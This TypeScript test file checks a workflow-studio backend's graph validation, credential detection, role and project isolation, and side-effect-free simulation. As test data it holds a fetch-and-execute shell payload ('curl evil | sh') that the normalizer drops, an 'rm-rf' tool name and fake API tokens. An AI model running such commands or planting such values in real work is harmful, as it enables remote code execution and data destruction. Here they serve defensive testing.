/**
 * UI Layer 4 — Workflow Studio backend.
 *
 * Server-side validation is authoritative, drafts persist in the durable record
 * store, published versions are immutable, rollback copies into a new draft,
 * simulation has no side effects, and every command is role + project gated.
 */
/* eslint-disable @typescript-eslint/no-explicit-any -- untyped JSON response bodies are asserted field by field */
import assert from "node:assert/strict";
import http from "node:http";
import type { AddressInfo } from "node:net";
import test from "node:test";

import { createControlPlaneApi } from "../api/index.js";
import {
  AgentOperationalStore,
  WorkflowControlStore,
  WorkforceCommandService,
  WorkforceQueryService,
  type ControlPlaneContext,
} from "../control/index.js";
import { workflowCapabilityContext } from "../control/services/workflow-studio-views.js";
import {
  AgentRegistry,
  ApprovalSystem,
  AuditLog,
  InMemoryExecutionRecordStore,
  PermissionSystem,
  ProjectRegistry,
  TaskSystem,
  ToolRegistry,
  WorkflowDefinitionService,
  WorkflowSystem,
  type OperatorPrincipal,
  type ProjectAdapter,
} from "../core/index.js";
import {
  normalizeWorkflowGraph,
  validateWorkflowGraph,
  type WorkflowCapabilityContext,
} from "../contracts/index.js";

const ADMIN: OperatorPrincipal = {
  id: "admin-1",
  role: "admin",
  allowedProjects: "*",
};
const OPERATOR: OperatorPrincipal = {
  id: "op-1",
  role: "operator",
  allowedProjects: ["alpha"],
};
const VIEWER: OperatorPrincipal = {
  id: "viewer-1",
  role: "viewer",
  allowedProjects: "*",
};
const BETA: OperatorPrincipal = {
  id: "op-2",
  role: "operator",
  allowedProjects: ["beta"],
};

const stubAdapter = (projectId: string): ProjectAdapter => ({
  projectId,
  async describe() {
    return { name: projectId, capabilities: [] };
  },
  async execute() {
    return {};
  },
});

function validGraph() {
  return {
    nodes: [
      {
        id: "start",
        kind: "trigger",
        label: "Start",
        config: {},
        position: { x: 0, y: 0 },
      },
      {
        id: "build",
        kind: "agent_task",
        label: "Implement",
        config: { taskType: "development", capability: "code" },
        position: { x: 200, y: 0 },
      },
      {
        id: "gate",
        kind: "approval",
        label: "Owner sign-off",
        config: { approvalAction: "accept implementation" },
        position: { x: 400, y: 0 },
      },
      {
        id: "done",
        kind: "terminal",
        label: "Done",
        config: {},
        position: { x: 600, y: 0 },
      },
    ],
    edges: [
      { id: "e1", from: "start", to: "build" },
      { id: "e2", from: "build", to: "gate" },
      { id: "e3", from: "gate", to: "done" },
    ],
  };
}

const ctxFor = (
  agents: WorkflowCapabilityContext["agents"],
  tools: string[] = [],
) => ({
  agents,
  tools: new Set(tools),
});
const devAgent = new Map([
  [
    "dev-agent",
    {
      capabilities: ["code"],
      supportedTaskTypes: ["development"],
      enabled: true,
    },
  ],
]);

function codes(
  graph: unknown,
  ctx: WorkflowCapabilityContext = ctxFor(devAgent),
) {
  const n = normalizeWorkflowGraph(graph);
  const r = validateWorkflowGraph(n.graph, ctx);
  return [...n.issues, ...r.issues].map((i) => i.code);
}

test("L4 VALIDATION: a well-formed graph backed by a real agent is valid", () => {
  assert.deepEqual(codes(validGraph()), []);
});

test("L4 VALIDATION: structural defects are each reported", () => {
  const g = validGraph();
  // cycle + self loop + duplicate + dangling
  const bad = {
    ...g,
    edges: [
      ...g.edges,
      { id: "e4", from: "gate", to: "build" },
      { id: "e5", from: "build", to: "build" },
      { id: "e6", from: "start", to: "build" },
      { id: "e7", from: "start", to: "ghost" },
    ],
  };
  const c = codes(bad);
  for (const code of ["CYCLE", "SELF_LOOP", "DUPLICATE_EDGE", "DANGLING_EDGE"])
    assert.ok(c.includes(code as never), code);

  const noEnds = { nodes: [g.nodes[1]], edges: [] };
  assert.ok(codes(noEnds).includes("MISSING_TRIGGER"));
  assert.ok(codes(noEnds).includes("MISSING_TERMINAL"));

  const orphan = {
    ...g,
    nodes: [...g.nodes, { ...g.nodes[3]!, id: "island" }],
  };
  assert.ok(codes(orphan).includes("UNREACHABLE"));

  const trigIn = {
    ...g,
    edges: [...g.edges, { id: "e8", from: "done", to: "start" }],
  };
  assert.ok(codes(trigIn).includes("TRIGGER_HAS_INPUT"));
  assert.ok(codes(trigIn).includes("TERMINAL_HAS_OUTPUT"));
});

test("L4 VALIDATION: capability references are checked against real registries", () => {
  assert.ok(
    codes(validGraph(), ctxFor(new Map())).includes("NO_AGENT_FOR_CAPABILITY"),
  );
  const disabled = new Map([
    [
      "dev-agent",
      {
        capabilities: ["code"],
        supportedTaskTypes: ["development"],
        enabled: false,
      },
    ],
  ]);
  assert.ok(
    codes(validGraph(), ctxFor(disabled)).includes("NO_AGENT_FOR_CAPABILITY"),
  );

  const g = validGraph();
  (g.nodes[1]!.config as any) = {
    taskType: "development",
    agentId: "ghost-agent",
  };
  assert.ok(codes(g).includes("UNKNOWN_AGENT"));
  (g.nodes[1]!.config as any) = {
    taskType: "development",
    agentId: "dev-agent",
    expectedTools: ["rm-rf"],
  };
  assert.ok(codes(g).includes("UNKNOWN_TOOL"));
  assert.ok(!codes(g, ctxFor(devAgent, ["rm-rf"])).includes("UNKNOWN_TOOL"));
  (g.nodes[1]!.config as any) = {};
  assert.ok(codes(g).includes("MISSING_TASK_TYPE"));
  assert.ok(codes(g).includes("MISSING_AGENT_OR_CAPABILITY"));

  const gate = validGraph();
  (gate.nodes[2]!.config as any) = {};
  assert.ok(codes(gate).includes("INVALID_APPROVAL"));
});

test("L4 VALIDATION: unsupported node kinds, credentials and oversize graphs are refused", () => {
  const g = validGraph();
  (g.nodes[1] as any).kind = "shell";
  assert.ok(codes(g).includes("UNSUPPORTED_NODE_KIND"));
  (g.nodes[1] as any).kind = "model";
  assert.ok(
    codes(g).includes("UNSUPPORTED_NODE_KIND"),
    "listed-but-unavailable kinds are not accepted",
  );

  const cred = validGraph();
  cred.nodes[1]!.label = "use sk-abcdefghijklmnopqrstuvwxyz123456";
  assert.ok(codes(cred).includes("CREDENTIAL_IN_GRAPH"));
  const cred2 = validGraph();
  (cred2.nodes[1] as any).description = "api_key=hunter2";
  assert.ok(codes(cred2).includes("CREDENTIAL_IN_GRAPH"));

  const huge = {
    nodes: Array.from({ length: 101 }, (_, i) => ({
      id: `n${i}`,
      kind: "terminal",
      label: "x",
    })),
    edges: [],
  };
  assert.ok(codes(huge).includes("LIMIT_EXCEEDED"));

  // Unknown keys are dropped, never persisted.
  const extra = validGraph() as any;
  extra.nodes[1].config.script = "curl evil | sh";
  extra.nodes[1].exec = true;
  const n = normalizeWorkflowGraph(extra);
  assert.equal((n.graph.nodes[1] as any).exec, undefined);
  assert.equal((n.graph.nodes[1]!.config as any).script, undefined);
});

async function api() {
  const agents = new AgentRegistry();
  agents.register({
    id: "dev-agent",
    name: "Developer",
    description: "dev",
    capabilities: ["code"],
    allowedTools: [],
    allowedProjects: ["alpha", "beta"],
    supportedTaskTypes: ["development"],
    permissions: [],
  });
  const projects = new ProjectRegistry();
  projects.register(stubAdapter("alpha"));
  projects.register(stubAdapter("beta"));
  const tools = new ToolRegistry();
  const agentOps = new AgentOperationalStore();
  const store = new InMemoryExecutionRecordStore();
  const workflows = new WorkflowSystem();
  const tasks = new TaskSystem();
  const ctx: ControlPlaneContext = {
    agents,
    tasks,
    workflows,
    approvals: new ApprovalSystem(),
    permissions: new PermissionSystem([]),
    tools,
    projects,
    audit: new AuditLog(),
    agentOps,
    workflowControl: new WorkflowControlStore(),
    workflowDefinitions: new WorkflowDefinitionService({
      store,
      capabilities: (pid) =>
        workflowCapabilityContext(
          { agents, tools, isAgentEnabled: (a, p) => agentOps.isEnabled(a, p) },
          pid,
        ),
    }),
  };
  const principals: Record<string, OperatorPrincipal> = {
    admin: ADMIN,
    operator: OPERATOR,
    viewer: VIEWER,
    beta: BETA,
  };
  const server = http.createServer(
    createControlPlaneApi({
      query: new WorkforceQueryService(ctx),
      command: new WorkforceCommandService(ctx),
      operatorDirectory: { resolve: async (token) => principals[token] },
    }),
  );
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const { port } = server.address() as AddressInfo;
  const call = async (
    method: string,
    path: string,
    token?: string,
    body?: unknown,
  ) => {
    const res = await fetch(`http://127.0.0.1:${port}/api${path}`, {
      method,
      headers: {
        ...(token ? { authorization: `Bearer ${token}` } : {}),
        ...(body !== undefined ? { "content-type": "application/json" } : {}),
      },
      ...(body !== undefined ? { body: JSON.stringify(body) } : {}),
    });
    const text = await res.text();
    return {
      status: res.status,
      body: (text ? JSON.parse(text) : null) as any,
    };
  };
  return {
    ctx,
    store,
    tasks,
    workflows,
    call,
    close: () => new Promise<void>((r) => server.close(() => r())),
  };
}

test("L4 HTTP: draft → validate → publish → immutable version → restore, all durable", async () => {
  const a = await api();
  try {
    const saved = await a.call(
      "POST",
      "/commands/save-workflow-draft",
      "operator",
      {
        projectId: "alpha",
        name: "Feature pipeline",
        graph: validGraph(),
      },
    );
    assert.equal(saved.status, 200, JSON.stringify(saved.body));
    const id = saved.body.resourceId as string;
    assert.equal(saved.body.details.draftRevision, 1);
    assert.equal(saved.body.details.valid, true);

    // Stale revision is refused (optimistic concurrency).
    const stale = await a.call(
      "POST",
      "/commands/save-workflow-draft",
      "operator",
      {
        projectId: "alpha",
        definitionId: id,
        expectedRevision: 0,
        name: "x",
        graph: validGraph(),
      },
    );
    assert.equal(stale.status, 409);

    // Operators author but may NOT publish.
    const opPublish = await a.call(
      "POST",
      "/commands/publish-workflow",
      "operator",
      {
        projectId: "alpha",
        definitionId: id,
        expectedRevision: 1,
      },
    );
    assert.equal(opPublish.status, 403);

    const pub = await a.call("POST", "/commands/publish-workflow", "admin", {
      projectId: "alpha",
      definitionId: id,
      expectedRevision: 1,
    });
    assert.equal(pub.status, 200, JSON.stringify(pub.body));
    assert.equal(pub.body.details.version, 1);
    assert.match(pub.body.details.graphHash, /^[0-9a-f]{64}$/);

    // Editing the draft does not touch version 1.
    const g2 = validGraph();
    g2.nodes[1]!.label = "Implement v2";
    const edit = await a.call(
      "POST",
      "/commands/save-workflow-draft",
      "operator",
      {
        projectId: "alpha",
        definitionId: id,
        expectedRevision: 1,
        name: "Feature pipeline",
        graph: g2,
      },
    );
    assert.equal(edit.status, 200);
    const detail = await a.call(
      "GET",
      `/projects/alpha/workflow-definitions/${id}`,
      "viewer",
    );
    assert.equal(detail.status, 200);
    assert.equal(detail.body.definition.draftRevision, 2);
    assert.equal(detail.body.versions.length, 1);
    assert.equal(detail.body.versions[0].graph.nodes[1].label, "Implement");

    // Restore copies v1 into a NEW draft revision; history is kept.
    const restore = await a.call(
      "POST",
      "/commands/restore-workflow-version",
      "operator",
      {
        projectId: "alpha",
        definitionId: id,
        version: 1,
      },
    );
    assert.equal(restore.status, 200);
    assert.equal(restore.body.details.draftRevision, 3);
    const after = await a.call(
      "GET",
      `/projects/alpha/workflow-definitions/${id}`,
      "viewer",
    );
    assert.equal(after.body.definition.draft.nodes[1].label, "Implement");
    assert.equal(after.body.versions.length, 1);

    // Durable: a brand-new service over the same store sees everything.
    const fresh = new WorkflowDefinitionService({
      store: a.store,
      capabilities: () => ({ agents: new Map(), tools: new Set() }),
    });
    assert.equal((await fresh.list("alpha")).length, 1);
    assert.equal((await fresh.versions("alpha", id)).length, 1);
  } finally {
    await a.close();
  }
});

test("L4 HTTP: an invalid draft saves but never publishes; viewers cannot write", async () => {
  const a = await api();
  try {
    const g = validGraph();
    g.edges.pop(); // terminal no longer reachable
    const saved = await a.call(
      "POST",
      "/commands/save-workflow-draft",
      "operator",
      {
        projectId: "alpha",
        name: "Broken",
        graph: g,
      },
    );
    assert.equal(saved.status, 200);
    assert.equal(saved.body.details.valid, false);
    const pub = await a.call("POST", "/commands/publish-workflow", "admin", {
      projectId: "alpha",
      definitionId: saved.body.resourceId,
      expectedRevision: 1,
    });
    assert.equal(pub.status, 400);

    const viewer = await a.call(
      "POST",
      "/commands/save-workflow-draft",
      "viewer",
      {
        projectId: "alpha",
        name: "x",
        graph: validGraph(),
      },
    );
    assert.equal(viewer.status, 403);

    const cred = validGraph();
    cred.nodes[1]!.label = "token=ghp_abcdefghijklmnopqrstuvwxyz0123";
    const credSave = await a.call(
      "POST",
      "/commands/save-workflow-draft",
      "operator",
      {
        projectId: "alpha",
        name: "Leak",
        graph: cred,
      },
    );
    assert.equal(credSave.status, 400, "credentials are refused, not stored");
  } finally {
    await a.close();
  }
});

test("L4 HTTP: project isolation (IDOR) — another project's operator sees and edits nothing", async () => {
  const a = await api();
  try {
    const saved = await a.call(
      "POST",
      "/commands/save-workflow-draft",
      "operator",
      {
        projectId: "alpha",
        name: "Alpha only",
        graph: validGraph(),
      },
    );
    const id = saved.body.resourceId as string;
    assert.equal(
      (await a.call("GET", "/projects/alpha/workflow-definitions", "beta"))
        .status,
      404,
    );
    assert.equal(
      (
        await a.call(
          "GET",
          `/projects/alpha/workflow-definitions/${id}`,
          "beta",
        )
      ).status,
      404,
    );
    // Asking via beta's own project for alpha's definition id is also not found.
    assert.equal(
      (await a.call("GET", `/projects/beta/workflow-definitions/${id}`, "beta"))
        .status,
      404,
    );
    const write = await a.call(
      "POST",
      "/commands/save-workflow-draft",
      "beta",
      {
        projectId: "alpha",
        definitionId: id,
        expectedRevision: 1,
        name: "hijack",
        graph: validGraph(),
      },
    );
    assert.equal(write.status, 403);
    const sideways = await a.call(
      "POST",
      "/commands/archive-workflow",
      "beta",
      {
        projectId: "beta",
        definitionId: id,
      },
    );
    assert.ok([403, 404].includes(sideways.status), String(sideways.status));
    assert.equal(
      (await a.call("GET", "/projects/alpha/workflow-definitions")).status,
      401,
    );
  } finally {
    await a.close();
  }
});

test("L4 SIMULATION: side-effect free, resolves real agents, creates no task or workflow", async () => {
  const a = await api();
  try {
    const saved = await a.call(
      "POST",
      "/commands/save-workflow-draft",
      "operator",
      {
        projectId: "alpha",
        name: "Sim",
        graph: validGraph(),
      },
    );
    const id = saved.body.resourceId as string;
    const auditBefore = a.ctx.audit.query({}).length;
    const sim = await a.call(
      "GET",
      `/projects/alpha/workflow-definitions/${id}/simulation?source=draft`,
      "viewer",
    );
    assert.equal(sim.status, 200);
    assert.equal(sim.body.mode, "simulation");
    assert.equal(sim.body.sideEffectFree, true);
    assert.deepEqual(
      sim.body.steps.map((s: any) => s.outcome),
      [
        "would_start",
        "would_dispatch",
        "would_wait_for_approval",
        "would_complete",
      ],
    );
    assert.equal(sim.body.steps[1].resolvedAgentId, "dev-agent");
    assert.equal(a.tasks.list().length, 0);
    assert.equal(a.workflows.list().length, 0);
    assert.equal(
      a.ctx.audit.query({}).length,
      auditBefore,
      "a read writes nothing",
    );

    // Disabling the agent is reflected immediately (no cached capability).
    a.ctx.agentOps.disable("dev-agent", "admin-1", "test");
    const blocked = await a.call(
      "GET",
      `/projects/alpha/workflow-definitions/${id}/simulation`,
      "viewer",
    );
    assert.equal(blocked.body.valid, false);

    const catalog = await a.call(
      "GET",
      "/projects/alpha/workflow-studio/catalog",
      "viewer",
    );
    assert.equal(catalog.status, 200);
    assert.equal(catalog.body.modes.liveExecution.available, false);
    assert.equal(catalog.body.modes.dryRun.available, false);
    assert.ok(
      catalog.body.unavailableNodeKinds.some((k: any) => k.kind === "model"),
    );
  } finally {
    await a.close();
  }
});

test("L6 MODEL REGISTRY: declared profiles only, auth required, nothing invented", async () => {
  const a = await api();
  try {
    assert.equal((await a.call("GET", "/intelligence/models")).status, 401);
    const missing = await a.call("GET", "/intelligence/models", "viewer");
    assert.equal(missing.status, 200);
    assert.deepEqual(missing.body, { configured: false });
    a.ctx.routing = {
      router: {
        get: async () => undefined,
        listByProject: async () => [],
      } as never,
      models: {
        list: () => [
          {
            id: "openai-default",
            providerId: "openai",
            capabilities: ["reasoning"],
          },
        ],
      },
      providers: { has: (id: string) => id === "openai" },
    };
    const reg = await a.call("GET", "/intelligence/models", "viewer");
    assert.equal(reg.body.configured, true);
    assert.deepEqual(reg.body.profiles, [
      {
        profileId: "openai-default",
        providerId: "openai",
        model: null,
        capabilities: ["reasoning"],
        providerRegistered: true,
      },
    ]);
    assert.equal(reg.body.pricing, "not_declared");
    assert.equal(reg.body.benchmarks, "not_measured");
    assert.equal(reg.body.credentialStatus, "not_reported");
  } finally {
    await a.close();
  }
});

test("L5 PIPELINE: stage modes are derived from what is composed — nothing claimed automated without a component", async () => {
  const a = await api();
  try {
    assert.equal(
      (await a.call("GET", "/software-factory/pipeline")).status,
      401,
    );
    const bare = await a.call("GET", "/software-factory/pipeline", "viewer");
    assert.equal(bare.status, 200);
    const mode = (body: any, stage: string) =>
      body.stages.find((s: any) => s.stage === stage).mode;
    // Nothing composed: no runner, no release pipeline, no deploy adapter.
    for (const stage of [
      "implementation",
      "environment_allocation",
      "testing",
      "build",
      "deployment",
      "production_verification",
      "pull_request",
    ])
      assert.equal(mode(bare.body, stage), "unavailable", stage);
    assert.equal(mode(bare.body, "security_review"), "not_configured");
    assert.equal(mode(bare.body, "human_approval"), "awaiting_approval");

    a.ctx.releaseCapabilities = {
      verification: false,
      sourceControl: false,
      deploymentAdapters: ["firebase-hosting"],
    };
    const withDeploy = await a.call(
      "GET",
      "/software-factory/pipeline",
      "viewer",
    );
    assert.equal(
      mode(withDeploy.body, "deployment"),
      "awaiting_approval",
      "deploys are approval-gated, never 'automated'",
    );
    assert.equal(mode(withDeploy.body, "testing"), "unavailable");
  } finally {
    await a.close();
  }
});
